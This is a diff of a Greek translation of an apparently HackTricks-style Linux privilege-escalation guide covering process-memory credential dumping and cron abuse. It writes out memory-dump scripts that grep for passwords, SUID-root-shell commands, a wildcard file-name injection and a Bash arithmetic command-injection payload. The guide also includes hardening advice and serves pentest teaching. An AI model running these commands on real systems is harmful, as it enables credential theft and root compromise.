-> - **kernel.yama.ptrace_scope = 2**: μόνο ο admin μπορεί να χρησιμοποιήσει ptrace, καθώς απαιτείται η capability CAP_SYS_PTRACE.
-> - **kernel.yama.ptrace_scope = 3**: καμία διεργασία δεν μπορεί να γίνει trace με ptrace. Μόλις οριστεί, απαιτείται reboot για να ενεργοποιηθεί ξανά το ptracing.
+> - **kernel.yama.ptrace_scope = 0**: μπορεί να γίνει debugging σε όλες τις διεργασίες, αρκεί να έχουν το ίδιο uid. Αυτός είναι ο κλασικός τρόπος λειτουργίας του ptracing.
+> - **kernel.yama.ptrace_scope = 1**: μπορεί να γίνει debugging μόνο σε διεργασία-γονέα.
+> - **kernel.yama.ptrace_scope = 2**: μόνο ο admin μπορεί να χρησιμοποιήσει το ptrace, καθώς απαιτείται η δυνατότητα CAP_SYS_PTRACE.
+> - **kernel.yama.ptrace_scope = 3**: δεν μπορεί να γίνει ptrace σε καμία διεργασία. Μόλις οριστεί, απαιτείται επανεκκίνηση για να ενεργοποιηθεί ξανά το ptracing.
+
+Μια διεργασία με το ίδιο UID που ξεκλειδώνει προσωρινά ένα password vault μπορεί να αποτελεί ξεχωριστό όριο προστασίας διαπιστευτηρίων. Όταν επιτρέπεται το tracing, μια ενεργή διεργασία που επιτρέπει τη δημιουργία dump μπορεί να αποκαλύψει τον κωδικό του vault μέσω των input syscalls ή της μνήμης της, παρόλο που το ίδιο το κρυπτογραφημένο αρχείο vault παραμένει προστατευμένο. Το `ptrace_scope=0` είναι μόνο μία από τις απαραίτητες προϋποθέσεις: σημαντικά είναι επίσης τα διαπιστευτήρια που ταιριάζουν, η δυνατότητα δημιουργίας dump της διεργασίας-στόχου, άλλα Linux security modules και η διάρκεια ζωής της διεργασίας. Για να χρησιμοποιηθεί μια καταχώριση του vault ως σύνδεση Unix root, απαιτείται ξεχωριστός έλεγχος επαναχρησιμοποίησης διαπιστευτηρίων. Η συνηθισμένη απαρίθμηση πρέπει να αναφέρει την πολιτική και τις πιθανές διεργασίες ή διαδρομές vault, όχι να καταγράφει την είσοδο ή να εμφανίζει μυστικά. Δείτε την [τεκμηρίωση Yama του kernel](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html) και τους [ελέγχους πρόσβασης ptrace](https://man7.org/linux/man-pages/man2/ptrace.2.html).
 
 #### GDB
 
-Αν έχετε πρόσβαση στη μνήμη μιας FTP υπηρεσίας, για παράδειγμα, θα μπορούσατε να λάβετε το Heap και να αναζητήσετε μέσα σε αυτό τα credentials της.
+Αν έχετε πρόσβαση στη μνήμη μιας υπηρεσίας FTP, για παράδειγμα, θα μπορούσατε να πάρετε το Heap και να αναζητήσετε μέσα σε αυτό τα διαπιστευτήριά της.
+
 ```bash
 gdb -p <FTP_PROCESS_PID>
 (gdb) info proc mappings
@@ -282,42 +347,50 @@ gdb -p <FTP_PROCESS_PID>
 (gdb) q
 strings /tmp/mem_ftp #User and password
 ```
+
 #### GDB Script
+
 ```bash:dump-memory.sh
 #!/bin/bash
 #./dump-memory.sh <PID>
 grep rw-p /proc/$1/maps \
-| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
-| while read start stop; do \
-gdb --batch --pid $1 -ex \
-"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
+    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
+    | while read start stop; do \
+    gdb --batch --pid $1 -ex \
+    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
 done
 ```
+
 #### /proc/$pid/maps & /proc/$pid/mem
 
-Για ένα δεδομένο process ID, το **maps δείχνει πώς χαρτογραφείται η μνήμη μέσα στον** virtual address space **του συγκεκριμένου process**· δείχνει επίσης τα **permissions κάθε χαρτογραφημένης περιοχής**. Το ψευδοαρχείο **mem εκθέτει την ίδια τη μνήμη του process**. Από το αρχείο **maps** γνωρίζουμε ποιες **περιοχές μνήμης είναι αναγνώσιμες** και τα offsets τους. Χρησιμοποιούμε αυτές τις πληροφορίες για να κάνουμε **seek στο αρχείο mem και να κάνουμε dump όλων των αναγνώσιμων περιοχών** σε ένα αρχείο.
+Για ένα δεδομένο process ID, το **maps δείχνει πώς αντιστοιχίζεται η μνήμη στον** εικονικό χώρο διευθύνσεων **αυτής της διεργασίας**· δείχνει επίσης τα **δικαιώματα πρόσβασης κάθε αντιστοιχισμένης περιοχής**. Το pseudo file **mem εκθέτει την ίδια τη μνήμη της διεργασίας**. Από το αρχείο **maps** γνωρίζουμε ποιες **περιοχές μνήμης είναι αναγνώσιμες** και τα offsets τους. Χρησιμοποιούμε αυτές τις πληροφορίες για να **μεταβούμε στο κατάλληλο σημείο του αρχείου mem και να αποθηκεύσουμε όλες τις αναγνώσιμες περιοχές** σε ένα αρχείο.
+
 ```bash
 procdump()
 (
-cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
-while read a b; do
-dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
-skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
-done )
-cat $1*.bin > $1.dump
-rm $1*.bin
+    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
+    while read a b; do
+        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
+           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
+    done )
+    cat $1*.bin > $1.dump
+    rm $1*.bin
 )
 ```
+
 #### /dev/mem
 
-Το `/dev/mem` παρέχει πρόσβαση στη **φυσική** μνήμη του συστήματος, όχι στην εικονική μνήμη. Ο εικονικός χώρος διευθύνσεων του kernel είναι προσβάσιμος μέσω του /dev/kmem.\
+Το `/dev/mem` παρέχει πρόσβαση στη **φυσική** μνήμη του συστήματος και όχι στην εικονική μνήμη. Ο χώρος εικονικών διευθύνσεων του kernel είναι προσβάσιμος μέσω του `/dev/kmem`.\
 Συνήθως, το `/dev/mem` είναι αναγνώσιμο μόνο από τον **root** και την ομάδα **kmem**.
+
 ```
 strings /dev/mem -n10 | grep -i PASS
 ```
+
 ### ProcDump για Linux
 
-Το ProcDump είναι μια Linux επανεκδοχή του κλασικού εργαλείου ProcDump από τη σουίτα εργαλείων Sysinternals για Windows. Αποκτήστε το από το [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
+Το ProcDump είναι μια επανεκδοχή για Linux του κλασικού εργαλείου ProcDump από τη σουίτα εργαλείων Sysinternals για Windows. Αποκτήστε το από το [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
+
 ```
 procdump -p 1714
 
@@ -344,42 +417,48 @@ Press Ctrl-C to end monitoring without terminating the process.
 [20:20:58 - INFO]: Timed:
 [20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
 ```
+
 ### Εργαλεία
 
 Για να κάνετε dump τη μνήμη μιας διεργασίας, μπορείτε να χρησιμοποιήσετε:
 
 - [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
-- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Μπορείτε να αφαιρέσετε χειροκίνητα τις απαιτήσεις root και να κάνετε dump της διεργασίας που ανήκει σε εσάς
+- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Μπορείτε να αφαιρέσετε χειροκίνητα τις απαιτήσεις για root και να κάνετε dump τη διεργασία που σας ανήκει
 - Το Script A.5 από το [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (απαιτείται root)
 
-### Credentials από τη μνήμη διεργασίας
+### Διαπιστευτήρια από τη μνήμη διεργασίας
 
 #### Χειροκίνητο παράδειγμα
 
-Αν διαπιστώσετε ότι η διεργασία authenticator εκτελείται:
+Αν διαπιστώσετε ότι εκτελείται η διεργασία authenticator:
+
 ```bash
 ps -ef | grep "authenticator"
 root      2027  2025  0 11:46 ?        00:00:00 authenticator
 ```
-Μπορείτε να κάνετε dump τη διεργασία (δείτε τις προηγούμενες ενότητες για να βρείτε διαφορετικούς τρόπους dump της μνήμης μιας διεργασίας) και να αναζητήσετε credentials μέσα στη μνήμη:
+
+Μπορείτε να κάνετε dump τη διεργασία (δείτε τις προηγούμενες ενότητες για να βρείτε διαφορετικούς τρόπους να κάνετε dump τη μνήμη μιας διεργασίας) και να αναζητήσετε διαπιστευτήρια στη μνήμη:
+
 ```bash
 ./dump-memory.sh 2027
 strings *.dump | grep -i password
 ```
+
 #### mimipenguin
 
-Το εργαλείο [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) θα **κλέψει διαπιστευτήρια σε μορφή απλού κειμένου από τη μνήμη** και από ορισμένα **γνωστά αρχεία**. Απαιτεί δικαιώματα root για να λειτουργήσει σωστά.
+Το εργαλείο [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) θα **υποκλέψει διαπιστευτήρια σε clear text από τη μνήμη** και από ορισμένα **γνωστά αρχεία**. Για να λειτουργήσει σωστά, απαιτεί δικαιώματα root.
 
-| Δυνατότητα                                      | Όνομα διεργασίας    |
-| ------------------------------------------------ | -------------------- |
-| Κωδικός πρόσβασης GDM (Kali Desktop, Debian Desktop)       | gdm-password         |
+| Λειτουργία                                       | Όνομα διεργασίας    |
+| ------------------------------------------------- | -------------------- |
+| Κωδικός πρόσβασης GDM (Kali Desktop, Debian Desktop) | gdm-password         |
 | Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
 | LightDM (Ubuntu Desktop)                          | lightdm              |
 | VSFTPd (Ενεργές συνδέσεις FTP)                   | vsftpd               |
-| Apache2 (Ενεργές συνεδρίες HTTP Basic Auth)      | apache2              |
-| OpenSSH (Ενεργές συνεδρίες SSH - Χρήση Sudo)     | sshd:                |
+| Apache2 (Ενεργές συνεδρίες HTTP Basic Auth)       | apache2              |
+| OpenSSH (Ενεργές συνεδρίες SSH - χρήση Sudo)      | sshd:                |
 
-#### Regex αναζήτησης/[truffleproc](https://github.com/controlplaneio/truffleproc)
+#### Αναζήτηση Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
+
 ```bash
 # un truffleproc.sh against your current Bash shell (e.g. $$)
 ./truffleproc.sh $$
@@ -393,23 +472,24 @@ Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
 # finding secrets
 # results in /tmp/tmp.o6HV0Pl3fe/results.txt
 ```
+
 ## Προγραμματισμένες εργασίες/Cron
 
-### Crontab UI (alseambusher) που εκτελείται ως root – web-based scheduler privesc
+### Crontab UI (alseambusher) που εκτελείται ως root – privesc μέσω web-based scheduler
 
-Αν ένα web “Crontab UI” panel (alseambusher/crontab-ui) εκτελείται ως root και είναι συνδεδεμένο μόνο στο loopback, μπορείτε και πάλι να αποκτήσετε πρόσβαση μέσω SSH local port-forwarding και να δημιουργήσετε μια privileged job για escalation.<sup>[[1]](#references)[[4]](#references)</sup>
+Αν ένας web πίνακας «Crontab UI» (alseambusher/crontab-ui) εκτελείται ως root και είναι δεσμευμένος μόνο στη loopback, μπορείτε και πάλι να αποκτήσετε πρόσβαση μέσω SSH local port-forwarding και να δημιουργήσετε μια προνομιούχα εργασία για να κλιμακώσετε τα δικαιώματά σας.<sup>[[1]](#references)[[4]](#references)</sup>
 
 Τυπική αλυσίδα
-- Εντοπίστε τη θύρα που είναι διαθέσιμη μόνο στο loopback (π.χ., 127.0.0.1:8000) και το Basic-Auth realm μέσω `ss -ntlp` / `curl -v localhost:8000`
-- Βρείτε credentials σε operational artifacts:
-- Backups/scripts με `zip -P <password>`
-- systemd unit που εκθέτει `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
-- Δημιουργήστε tunnel και κάντε login:
+- Εντοπίστε μια θύρα προσβάσιμη μόνο μέσω loopback (π.χ., 127.0.0.1:8000) και το Basic-Auth realm μέσω `ss -ntlp` / `curl -v localhost:8000`
+- Βρείτε διαπιστευτήρια σε λειτουργικά τεκμήρια:
+  - Αντίγραφα ασφαλείας/σενάρια με `zip -P <password>`
+  - Μονάδα systemd που εκθέτει `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
+- Δημιουργήστε tunnel και συνδεθείτε:
 ```bash
 ssh -L 9001:localhost:8000 user@target
 # browse http://localhost:9001 and authenticate
 ```
-- Δημιουργήστε ένα high-priv job και εκτελέστε το αμέσως (drops SUID shell):
+- Δημιουργήστε μια εργασία με υψηλά προνόμια και εκτελέστε την αμέσως (τοποθετεί ένα SUID shell):
 ```bash
 # Name: escalate
 # Command:
@@ -419,24 +499,29 @@ cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
 ```bash
 /tmp/rootshell -p   # root shell
 ```
-Σκληρυνση
-- Μην εκτελείτε το Crontab UI ως root· περιορίστε το με έναν dedicated user και τα ελάχιστα απαιτούμενα permissions
-- Κάντε bind στο localhost και περιορίστε επιπλέον την πρόσβαση μέσω firewall/VPN· μην επαναχρησιμοποιείτε passwords
-- Αποφύγετε την ενσωμάτωση secrets σε unit files· χρησιμοποιήστε secret stores ή EnvironmentFile προσβάσιμο μόνο από τον root
-- Ενεργοποιήστε audit/logging για on-demand job executions
 
-Ελέγξτε αν κάποιο scheduled job είναι ευάλωτο. Ίσως μπορείτε να εκμεταλλευτείτε ένα script που εκτελείται από τον root (wildcard vuln; μπορείτε να τροποποιήσετε αρχεία που χρησιμοποιεί ο root; να χρησιμοποιήσετε symlinks; να δημιουργήσετε συγκεκριμένα αρχεία στον κατάλογο που χρησιμοποιεί ο root;).
+Ενίσχυση ασφάλειας
+- Μην εκτελείτε το Crontab UI ως root· περιορίστε το με αποκλειστικό χρήστη και ελάχιστα δικαιώματα
+- Κάντε bind στο localhost και περιορίστε επιπλέον την πρόσβαση μέσω firewall/VPN· μην επαναχρησιμοποιείτε κωδικούς πρόσβασης
+- Αποφύγετε την ενσωμάτωση μυστικών σε unit files· χρησιμοποιήστε secret stores ή EnvironmentFile με πρόσβαση μόνο από root
+- Ενεργοποιήστε audit/logging για εκτελέσεις εργασιών κατ’ απαίτηση
+
+Ελέγξτε αν κάποια προγραμματισμένη εργασία είναι ευάλωτη. Ίσως μπορείτε να εκμεταλλευτείτε ένα script που εκτελείται από τον root (wildcard vuln; μπορείτε να τροποποιήσετε αρχεία που χρησιμοποιεί ο root; να χρησιμοποιήσετε symlinks; να δημιουργήσετε συγκεκριμένα αρχεία στον κατάλογο που χρησιμοποιεί ο root;).
+
 ```bash
 crontab -l
 ls -al /etc/cron* /etc/at*
 cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
 ```
-Αν χρησιμοποιείται το `run-parts`, ελέγξτε ποια ονόματα θα εκτελεστούν πραγματικά:
+
+Αν χρησιμοποιείται το `run-parts`, ελέγξτε ποια ονόματα θα εκτελεστούν στην πράξη:
+
 ```bash
 run-parts --test /etc/cron.hourly
 run-parts --test /etc/cron.daily
 ```
-Αυτό αποτρέπει τα false positives. Ένας εγγράψιμος περιοδικός κατάλογος είναι χρήσιμος μόνο αν το όνομα αρχείου του payload ταιριάζει με τους τοπικούς κανόνες του `run-parts`.
+
+Αυτό αποτρέπει τα false positives. Ένας εγγράψιμος περιοδικός κατάλογος είναι χρήσιμος μόνο αν το όνομα του payload ταιριάζει με τους τοπικούς κανόνες του `run-parts`.
 
 ### Διαδρομή Cron
 
@@ -446,20 +531,24 @@ run-parts --test /etc/cron.daily
 
 Αν μέσα σε αυτό το crontab ο χρήστης root προσπαθήσει να εκτελέσει κάποια εντολή ή script χωρίς να ορίσει το path. Για παράδειγμα: _\* \* \* \* root overwrite.sh_\
 Τότε, μπορείτε να αποκτήσετε ένα root shell χρησιμοποιώντας:
+
 ```bash
 echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
 #Wait cron job to be executed
 /tmp/bash -p #The effective uid and gid to be set to the real uid and gid
 ```
-### Cron using a script with a wildcard (Wildcard Injection)
 
-Αν ένα script που εκτελείται από τον root περιέχει ένα “**\***” μέσα σε μια εντολή, θα μπορούσες να το εκμεταλλευτείς για να προκαλέσεις απρόσμενες ενέργειες (όπως privesc). Παράδειγμα:
+### Cron μέσω script με wildcard (Wildcard Injection)
+
+Αν ένα script που εκτελείται από τον root έχει ένα “**\***” μέσα σε μια εντολή, θα μπορούσατε να το εκμεταλλευτείτε για να προκαλέσετε απρόσμενα πράγματα (όπως privesc). Παράδειγμα:
+
 ```bash
 rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
 ```
-**Αν το wildcard προηγείται από μια διαδρομή όπως** _**/some/path/\***_ **, δεν είναι ευάλωτο (ούτε το** _**./\***_ **).**
 
-Διαβάστε την ακόλουθη σελίδα για περισσότερα tricks εκμετάλλευσης wildcard:
+**Αν πριν από το wildcard υπάρχει διαδρομή όπως** _**/some/path/\***_ **, δεν είναι ευάλωτο (ούτε το** _**./\***_ **).**
+
+Διαβάστε την παρακάτω σελίδα για περισσότερα tricks εκμετάλλευσης wildcard:
 
 
 {{#ref}}
@@ -467,99 +556,93 @@ rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh mys
 {{#endref}}
 
 
-### Injection αριθμητικής επέκτασης Bash σε cron log parsers
+### Injection μέσω αριθμητικής επέκτασης Bash σε parsers αρχείων καταγραφής cron
 
-Το Bash εκτελεί parameter expansion και command substitution πριν από την arithmetic evaluation στα ((...)), $((...)) και let. Αν ένα root cron/parser διαβάζει μη αξιόπιστα πεδία log και τα τροφοδοτεί σε arithmetic context, ένας attacker μπορεί να εισαγάγει ένα command substitution $(...), το οποίο εκτελείται ως root όταν εκτελείται το cron.<sup>[[22]](#references)</sup>
+Η αριθμητική του Bash μπορεί να ερμηνεύσει μη έμπιστο κείμενο ως έκφραση. Σε ορισμένα περιβάλλοντα Bash, ένας δείκτης πίνακα μέσα σε αυτή την έκφραση μπορεί να αξιολογήσει μια αντικατάσταση εντολής. Αν ένας προνομιούχος cron/parser τοποθετήσει κείμενο αρχείου καταγραφής που ελέγχεται από εισβολέα σε μια τέτοια αριθμητική σύγκριση, η αντικατάσταση μπορεί να εκτελεστεί με την ταυτότητα του parser.<sup>[[22]](#references)</sup> Αυτό εξαρτάται από την ακριβή έκφραση και έκδοση του Bash· μια γυμνή συμβολοσειρά `$(...)0` σε μια επεκτεινόμενη μεταβλητή δεν αποτελεί από μόνη της αξιόπιστη απόδειξη επαναξιολόγησης.
 
-- Γιατί λειτουργεί: Στο Bash, οι επεκτάσεις πραγματοποιούνται με την εξής σειρά: parameter/variable expansion, command substitution, arithmetic expansion και στη συνέχεια word splitting και pathname expansion. Έτσι, μια τιμή όπως `$(/bin/bash -c 'id > /tmp/pwn')0` αντικαθίσταται αρχικά (εκτελώντας την εντολή) και στη συνέχεια το αριθμητικό `0` που απομένει χρησιμοποιείται για την arithmetic, ώστε το script να συνεχίσει χωρίς errors.
+Η είσοδος μπορεί επίσης να προέρχεται από μεταδεδομένα αρχείων ή από άλλο πεδίο που διαβάζεται από μια θέση εγγράψιμη από χρήστη. Για παράδειγμα, ένα προνομιούχο script εκκαθάρισης που διαβάζει την ετικέτα `Producer` μιας εικόνας και τη συγκρίνει με `[[ "$producer" -eq "expected" ]]` εκτελεί αριθμητική σύγκριση, παρότι η μεταβλητή βρίσκεται σε εισαγωγικά. Εντοπίστε την ταυτότητα εκτέλεσης της προγραμματισμένης εργασίας, ποια αρχεία μπορούν να παρέχουν την ετικέτα, τυχόν μετασχηματισμούς πριν από τη σύγκριση και την ακριβή συμπεριφορά του Bash. Για ετικέτες κειμένου, χρησιμοποιήστε σύγκριση συμβολοσειρών· για αριθμούς, επικυρώστε ότι η είσοδος αποτελείται από δεκαδικά ψηφία πριν από την αριθμητική πράξη. Δείτε τους [κανόνες αριθμητικής του Bash](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html).
 
-- Τυπικό vulnerable pattern:
-```bash
-#!/bin/bash
-# Example: parse a log and "sum" a count field coming from the log
-while IFS=',' read -r ts user count rest; do
-# count is untrusted if the log is attacker-controlled
-(( total += count ))     # or: let "n=$count"
-done < /var/www/app/log/application.log
-```
+- Τυπικό ευάλωτο μοτίβο:
+  ```bash
+  #!/bin/bash
+  # Example: parse a log and "sum" a count field coming from the log
+  while IFS=',' read -r ts user count rest; do
+      # count is untrusted if the log is attacker-controlled
+      (( total += count ))     # or: let "n=$count"
+  done < /var/www/app/log/application.log
+  ```
 
-- Exploitation: Προκαλέστε την εγγραφή κειμένου που ελέγχεται από τον attacker στο parsed log, έτσι ώστε το numeric-looking field να περιέχει ένα command substitution και να τελειώνει με ένα digit. Βεβαιωθείτε ότι η εντολή σας δεν εκτυπώνει στο stdout (ή κάντε redirect), ώστε η arithmetic να παραμένει valid.
-```bash
-# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
-$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
-# When the root cron parser evaluates (( total += count )), your command runs as root.
-```
+- Ασφαλής τοπική διερεύνηση συμπεριφοράς για τον μηχανισμό array-subscript (χωρίς διεργασία με αυξημένα προνόμια ή αλλαγή αρχείου):
+  ```bash
+  code='x[$(printf marker >&2)]'
+  [[ 200 -eq "$code" ]]
+  # Bash may print "marker" while evaluating the arithmetic operand.
+  ```
 
-### Overwriting και symlink σε Cron script
+Εντοπίστε το πραγματικό προγραμματισμένο script και το κυριολεκτικό path εισόδου που ανοίγει. Ακόμα κι όταν το ίδιο το αρχείο log δεν είναι εγγράψιμο, ένας χρήστης που μπορεί να γράψει και να διασχίσει τον μη sticky γονικό του κατάλογο ενδέχεται να μπορεί να αντικαταστήσει την καταχώρισή του. Η `namei -l` βοηθά να διακρίνετε αυτά τα δικαιώματα. Ένα διαφορετικό εγγράψιμο path για log, ένας scheduler που δεν είναι αναγνώσιμος ή ένας parser που δεν αξιολογεί ποτέ αυτό το πεδίο ως αριθμητική έκφραση Bash δεν τεκμηριώνει αυτή τη δυνατότητα.
 
-Αν **μπορείτε να τροποποιήσετε ένα cron script** που εκτελείται από τον root, μπορείτε πολύ εύκολα να αποκτήσετε shell:
+### Αντικατάσταση cron script και symlink
+
+Αν **μπορείτε να τροποποιήσετε ένα cron script** που εκτελείται από τον root, μπορείτε να αποκτήσετε shell πολύ εύκολα:
+
 ```bash
 echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
 #Wait until it is executed
 /tmp/bash -p
 ```
-Αν το script που εκτελείται από τον root χρησιμοποιεί έναν **κατάλογο στον οποίο έχετε πλήρη πρόσβαση**, ίσως είναι χρήσιμο να διαγράψετε αυτόν τον φάκελο και να **δημιουργήσετε έναν φάκελο symlink προς έναν άλλο**, ο οποίος θα εξυπηρετεί ένα script που ελέγχετε εσείς.
+
+Αν το script που εκτελείται από τον root χρησιμοποιεί έναν **κατάλογο στον οποίο έχεις πλήρη πρόσβαση**, ίσως θα ήταν χρήσιμο να διαγράψεις αυτόν τον φάκελο και να δημιουργήσεις έναν φάκελο symlink προς έναν άλλο, ο οποίος περιέχει ένα script υπό τον έλεγχό σου.
+
 ```bash
 ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
 ```
+
 ### Επικύρωση symlink και ασφαλέστερος χειρισμός αρχείων
 
-Κατά την εξέταση privileged scripts/binaries που διαβάζουν ή γράφουν αρχεία μέσω path, επαληθεύστε τον τρόπο χειρισμού των links:
+Κατά την εξέταση προνομιούχων scripts/binaries που διαβάζουν ή γράφουν αρχεία μέσω διαδρομής, ελέγξτε πώς γίνεται ο χειρισμός των συνδέσμων:
 
-- Το `stat()` ακολουθεί ένα symlink και επιστρέφει metadata του target.
-- Το `lstat()` επιστρέφει metadata του ίδιου του link.
-- Τα `readlink -f` και `namei -l` βοηθούν στην επίλυση του τελικού target και εμφανίζουν τα permissions κάθε component του path.
+- Το `stat()` ακολουθεί ένα symlink και επιστρέφει τα μεταδεδομένα του στόχου.
+- Το `lstat()` επιστρέφει τα μεταδεδομένα του ίδιου του συνδέσμου.
+- Τα `readlink -f` και `namei -l` βοηθούν στην επίλυση του τελικού στόχου και εμφανίζουν τα δικαιώματα κάθε στοιχείου της διαδρομής.
+
 ```bash
 readlink -f /path/to/link
 namei -l /path/to/link
 ```
-Για defenders/developers, ασφαλέστερα patterns έναντι symlink tricks περιλαμβάνουν:
 
-- `O_EXCL` με `O_CREAT`: αποτυγχάνει αν το path υπάρχει ήδη (μπλοκάρει links/files που έχουν δημιουργηθεί εκ των προτέρων από attacker).
-- `openat()`: λειτουργεί relative σε ένα trusted directory file descriptor.
-- `mkstemp()`: δημιουργεί temporary files atomic με secure permissions.
+Για τους defenders/developers, ασφαλέστερες πρακτικές για την αντιμετώπιση τεχνασμάτων με symlink είναι:
 
-### Custom-signed cron binaries με writable payloads
-Οι Blue teams μερικές φορές κάνουν "sign" τα cron-driven binaries, κάνοντας dump ένα custom ELF section και χρησιμοποιώντας grep για ένα vendor string πριν τα εκτελέσουν ως root. Αν αυτό το binary είναι group-writable (π.χ. `/opt/AV/periodic-checks/monitor` με owner `root:devs 770`) και μπορείς να κάνεις leak το signing material, μπορείς να κάνεις forge το section και να κάνεις hijack το cron task:<sup>[[2]](#references)</sup>
+- `O_EXCL` με `O_CREAT`: αποτυγχάνει αν η διαδρομή υπάρχει ήδη (εμποδίζει συνδέσμους/αρχεία που έχει δημιουργήσει εκ των προτέρων ο attacker).
+- `openat()`: λειτουργεί σε σχέση με έναν έμπιστο file descriptor καταλόγου.
+- `mkstemp()`: δημιουργεί προσωρινά αρχεία ατομικά, με ασφαλή δικαιώματα.
 
-1. Χρησιμοποίησε το `pspy` για να capture-άρεις το verification flow. Στο Era, το root εκτελούσε `objcopy --dump-section .text_sig=text_sig_section.bin monitor`, ακολουθούμενο από `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin`, και έπειτα εκτελούσε το file.
-2. Recreate το expected certificate χρησιμοποιώντας το leaked key/config (από το `signing.zip`):
-```bash
-openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
-```
-3. Κάνε build ένα malicious replacement (π.χ. κάνε drop ένα SUID bash, πρόσθεσε το SSH key σου) και κάνε embed το certificate στο `.text_sig`, ώστε να περνάει το grep:
-```bash
-gcc -fPIC -pie monitor.c -o monitor
-objcopy --add-section .text_sig=cert.pem monitor
-objcopy --dump-section .text_sig=text_sig_section.bin monitor
-strings text_sig_section.bin | grep 'Era Inc.'
-```
-4. Κάνε overwrite το scheduled binary διατηρώντας τα execute bits:
-```bash
-cp monitor /opt/AV/periodic-checks/monitor
-chmod 770 /opt/AV/periodic-checks/monitor
-```
-5. Περίμενε το επόμενο cron run· μόλις περάσει ο naive signature check, το payload σου θα εκτελεστεί ως root.
+### Cron binaries με προσαρμοσμένη υπογραφή και writable payloads
+Ένας απλός χρήστης που μπορεί να γράψει στο συγκεκριμένο binary που εκτελείται από ένα root cron job ενδέχεται να διασχίσει ένα όριο προνομίων, αλλά ένας έλεγχος προσαρμοσμένης υπογραφής μπορεί να απορρίψει μια unsigned αντικατάσταση. Στην τεκμηριωμένη περίπτωση, το ELF ανήκε στον root και είχε mode `0760`, επιτρέποντας σε μέλος της ομάδας του να το τροποποιήσει, ενώ ο root owner μπορούσε να το εκτελέσει. Ένα ορατό process trace έδειξε ότι εκτελούνταν `objcopy` για την εξαγωγή του `.text_sig` πριν το job εκτελέσει το binary· το πλήρες script επαλήθευσης δεν ήταν αναγνώσιμο.<sup>[[2]](#references)</sup>
+
+Η αντικατάσταση που πέτυχε υπογράφηκε με leaked ιδιωτικό υλικό υπογραφής, χρησιμοποιώντας έναν ELF signer. Η [τεκμηρίωση της μορφής](https://github.com/NUAA-WatchDog/linux-elf-binary-signer) περιγράφει ένα τμήμα υπογραφής που προκύπτει από το `.text` του εκτελέσιμου. Δεν αποδεικνύεται ότι η απλή προσθήκη ενός πιστοποιητικού ή μιας συμβολοσειράς που ταιριάζει στο `.text_sig` ικανοποιεί τον μη ορατό verifier. Ελέγξτε την πραγματική προγραμματισμένη διαδρομή, την αποτελεσματική πρόσβαση εγγραφής, την εκτέλεση από τον root και την πολιτική του verifier πριν συμπεράνετε ότι ένα writable signed binary είναι exploitable. Ένα τμήμα `.text_sig` από μόνο του αποτελεί απλώς ένδειξη προς εξέταση.
 
 ### Συχνά cron jobs
 
-Μπορείς να κάνεις monitor τις processes για να αναζητήσεις processes που εκτελούνται κάθε 1, 2 ή 5 λεπτά. Ίσως μπορέσεις να το εκμεταλλευτείς και να κάνεις privilege escalation.
+Μπορείτε να παρακολουθείτε τις διεργασίες για να εντοπίσετε όσες εκτελούνται κάθε 1, 2 ή 5 λεπτά. Ίσως μπορέσετε να το εκμεταλλευτείτε για να κλιμακώσετε τα προνόμιά σας.
 
-Για παράδειγμα, για **monitor κάθε 0.1s κατά τη διάρκεια 1 λεπτού**, να κάνεις **sort με βάση τις λιγότερο εκτελεσμένες εντολές** και να διαγράψεις τις εντολές που έχουν εκτελεστεί τις περισσότερες φορές, μπορείς να εκτελέσεις:
